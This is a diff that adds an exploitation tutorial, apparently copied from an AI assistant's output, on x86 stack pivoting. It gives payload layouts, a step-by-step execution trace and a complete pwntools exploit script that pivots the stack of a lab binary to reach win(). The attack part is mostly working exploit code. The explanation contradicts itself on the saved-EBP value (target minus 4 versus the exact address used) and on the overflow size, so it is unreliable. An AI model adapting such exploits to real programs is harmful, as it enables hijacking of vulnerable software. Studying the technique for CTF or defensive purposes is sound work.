@@ -1,1 +1,101 @@
+When a stack buffer overflow provides too little space on the stack to hold a full ROP (Return-Oriented Programming) chain, attackers look to a technique called stack pivoting.
+Stack pivoting allows you to change the location of the stack pointer (ESP or RSP) to an arbitrary region of memory that you do control (such as a large heap buffer, the .bss section, or a larger portion of your input string).
+The most classic and elegant way to achieve this on x86 architectures is by abusing leave; ret assembly gadgets.
 
+1. The Anatomy of a leave; ret Gadget
+
+To understand stack pivoting, you must look closely at what happens when a C function finishes executing. Every standard function ends with two instructions: leave and ret.
+The leave instruction is actually a shorthand macro for two operations:
+1. mov esp, ebp (Set the stack pointer to the base pointer)
+2. pop ebp (Pop the top of the stack back into the base pointer)
+The ret instruction is:
+• pop eip (Jump to the address currently sitting on top of the stack)
+
+The Trick
+
+If you use a buffer overflow to overwrite both the Saved EBP (Base Pointer) and the Return Address, you can carefully control the stack alignment:
+• Overwrite Saved EBP with: The target address where you want your new stack to be minus 4 bytes.
+• Overwrite Return Address with: The address of a leave; ret gadget.
+When the function naturally exits, it runs its own leave; ret, causing your controlled address to load into EBP. When it immediately executes the second leave; ret gadget that you injected, your fake stack address is moved directly into ESP. The stack has pivoted.
+
+2. A Concrete Stack Pivot Scenario
+
+Imagine a program reads 100 bytes into a global buffer called data_buffer located in a fixed memory space (like the .bss section). Later, it runs a vulnerable function that only lets you overflow 12 bytes on the stack.
+12 bytes is only enough space to overwrite the Saved EBP and the Return Address—it is not enough space to write a ROP chain to call system("/bin/sh").
+
+The Fake Stack Payload (Sent to data_buffer at 0x0804a000)
+
+text
+[ 4 bytes: Dummy / Padding ] + [ 4 bytes: Address of win() ]
+Use code with caution.
+(Note: The first 4 bytes are dummy bytes because the pop ebp part of the leave instruction will consume them immediately upon pivoting).
+
+The Stack Overflow Payload (Sent to the vulnerable stack buffer)
+
+text
+[ 64 bytes of junk ] + [ 4 bytes: Target Address 0x0804a000 ] + [ 4 bytes: Address of leave;ret gadget ]
+Use code with caution.
+
+3. Visualizing the Execution Chain
+
+text
+STEP 1: Function exits naturally and runs 'leave'
+        -> ESP moves to EBP. 
+        -> 'pop ebp' loads 0x0804a000 into EBP.
+
+STEP 2: Function runs 'ret'
+        -> Pops the next address into EIP, which is our 'leave; ret' gadget.
+
+STEP 3: The gadget executes 'leave' (mov esp, ebp; pop ebp)
+        -> ESP is forced to become EBP (0x0804a000). The stack has shifted!
+        -> 'pop ebp' pops the first 4 dummy bytes out of our fake stack. ESP is now 0x0804a004.
+
+STEP 4: The gadget executes 'ret' (pop eip)
+        -> Pops the next value from the new stack (the address of win()) into EIP.
+        -> Execution successfully hijacked to win() using zero stack space!
+Use code with caution.
+
+4. The Python Exploit Script (pivot.py)
+
+Using pwntools, we can locate the leave; ret gadget dynamically from the binary and stitch the two payloads together perfectly.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Load the binary into pwntools for asset lookup
+elf = ELF('./pivot_vuln')
+io = process('./pivot_vuln')
+
+# 1. Locate our targets and gadgets
+# Find the fixed address of the global buffer where our large payload sits
+target_buffer = elf.symbols['data_buffer'] 
+
+# Find a 'leave; ret' gadget inside the binary executable space
+leave_ret = rop.ROP(elf).find_gadget(['leave', 'ret'])[0]
+win_address = elf.symbols['win']
+
+log.info(f"Global Buffer (Fake Stack) Address: {hex(target_buffer)}")
+log.info(f"Found 'leave; ret' gadget at: {hex(leave_ret)}")
+
+# 2. Build the Fake Stack Payload
+# The first 4 bytes are consumed by 'pop ebp', the next 4 bytes are hit by 'ret'
+fake_stack = b"AAAA" + p32(win_address)
+
+# Send fake stack to the global buffer prompt
+io.recvuntil(b"Enter global data: ")
+io.sendline(fake_stack)
+
+# 3. Build the Stack Overflow Payload
+# Fill the tiny buffer up to the Saved EBP
+overflow_offset = 64
+payload = b"B" * overflow_offset
+payload += p32(target_buffer)  # Overwrite Saved EBP with fake stack address
+payload += p32(leave_ret)      # Overwrite Return Address with gadget
+
+# Send stack overflow payload to trigger the chain
+io.recvuntil(b"Enter vulnerable text: ")
+io.sendline(payload)
+
+# Interact with the shell
+io.interactive()
+Use code with caution.
